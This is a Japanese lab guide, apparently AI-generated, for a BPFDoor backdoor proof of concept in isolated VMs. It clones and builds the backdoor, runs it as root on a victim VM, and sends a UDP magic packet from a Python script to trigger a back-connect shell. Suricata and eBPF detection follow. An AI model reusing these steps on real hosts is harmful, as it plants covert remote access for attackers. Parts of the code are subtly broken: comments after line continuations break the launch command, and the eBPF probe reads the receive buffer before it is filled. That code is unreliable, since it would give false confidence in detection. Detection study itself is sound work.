以下は、malwaredevil/BPFDoor-Backdoor リポジトリを使用した PoC（Proof-of-Concept）構成の例です。  
→ **隔離されたテスト用VM**（例：VirtualBox/KVM）またはDockerコンテナでのみ実行してください！

---

## 1. テスト環境の準備

- **OS**: Ubuntu 22.04（または Rocky Linux 9）
- **必須パッケージ**:
  ```bash
  sudo apt-get update
  sudo apt-get install -y build-essential git python3 python3-pip bpfcc-tools
  ```

- **ネットワーク**: VMはホスト専用または内部ブリッジで外部アクセスを遮断

---

## 2. バックドアソースのクローンとビルド

```bash
git clone https://github.com/malwaredevil/BPFDoor-Backdoor.git
cd BPFDoor-Backdoor
make
# → 出力物: ./bpfdoor
```

---

## 3. バックドアの実行（被害者）

```bash
# ルート権限で実行
sudo ./bpfdoor \
  --listen-ip 0.0.0.0 \   # 受信するIP
  --listen-port 9999      # マジックパケットのポート
```

> この状態で待機すると、指定したUDPポートに「マジックシーケンス」を受信したときにシェル（バックコネクト）を開きます。

---

## 4. マジックパケットの送信（攻撃者）

```bash
# send_magic.py
import socket

MAGIC = b'MAGICPING'          # リポジトリのコードに合わせて  
TARGET = ("192.168.56.101", 9999)  # 被害者のIP:ポート

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(MAGIC, TARGET)
print("マジックパケットを送信しました")
```

```bash
python3 send_magic.py
```
→ 被害者側で `nc` などを使ってシェルが開くか確認

---

## 5. 検出シナリオ

### 5.1 Suricataルール

```yaml
# /etc/suricata/rules/bpfdoor.rules
alert udp any any -> any 9999 \
  (msg:"[PoC] BPFDoor magic packet"; content:"MAGICPING"; sid:9000001; rev:1;)
```

```bash
sudo suricata -c /etc/suricata/suricata.yaml --af-packet any -S /etc/suricata/rules/bpfdoor.rules
```

---

### 5.2 eBPFリアルタイムモニタリング（bcc使用）

```python
# detect_bpfdoor.py
from bcc import BPF

prog = r"""
int kprobe__sys_recvfrom(struct pt_regs *ctx) {
    // bufポインタはPT_REGS_PARM2(ctx)
    char buf[8];
    bpf_probe_read(&buf, sizeof(buf), (void *)PT_REGS_PARM2(ctx));
    // "MAGICPIN"をチェック（最後のGは次のバイト）
    if (buf[0]=='M' && buf[1]=='A' && buf[2]=='G' && buf[3]=='I'
     && buf[4]=='C' && buf[5]=='P' && buf[6]=='I' && buf[7]=='N') {
        bpf_trace_printk(">> BPFDoorトリガーを検出\\n");
    }
    return 0;
}
"""
b = BPF(text=prog)
print("recvfrom() をトレース中… Ctrl-Cで終了")
b.trace_print()
```

```bash
sudo python3 detect_bpfdoor.py
```

→ マジックパケットを受信するたびに `>> BPFDoor trigger detected` のログが出力される

---

## 6. 全体PoCの流れ

1. **被害者VM** で Suricata（またはeBPFスクリプト）によるモニタリングを開始  
2. **被害者VM** で `sudo ./bpfdoor` を実行  
3. **攻撃者VM** で `python3 send_magic.py` を実行  
4. Suricataのアラート発生またはeBPFログ確認 → 攻撃を検出  

---

